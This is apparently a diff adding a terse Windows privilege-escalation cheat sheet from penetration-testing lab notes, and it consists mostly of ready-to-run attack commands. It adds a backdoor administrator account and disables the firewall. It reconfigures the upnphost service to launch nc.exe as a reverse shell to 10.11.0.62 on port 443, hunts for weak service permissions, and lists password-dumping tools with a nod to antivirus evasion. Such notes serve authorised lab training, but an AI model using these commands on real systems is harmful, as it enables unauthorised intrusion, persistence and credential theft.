@@ -1,0 +1,30 @@
+WINDOWS
+
+IF YOU HAVE LIMITED TIME BUT SYSTEM SHELL
+type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
+net user h4x Password123! /add
+net localgroup "Administrators" h4x /add
+netsh firewall set opmode disable (xp only)
+
+Changing Service Details
+
+accesschkOLD.exe /accepteula -uqcv <service name>
+sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe -nv 10.11.0.62 443 -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+
+May have to fix any dependencies also
+
+ICACLS to find service file permission vulnerabilities
+
+ICACLS <service_exe_name>
+
+Then can change to a an exe that you have made (page 212 of PDF)
+
+Use DIR /A to show all files inc NTFS files with HIDDEN flag.
+
+Netstat-fu
+netstat -an|find "<string or port number>"
+
+Password Dumping
+Use PWDump, WCE (-w for cleartext) or FGDump.
+Be aware of LM/NTLM differences and AV evasion!
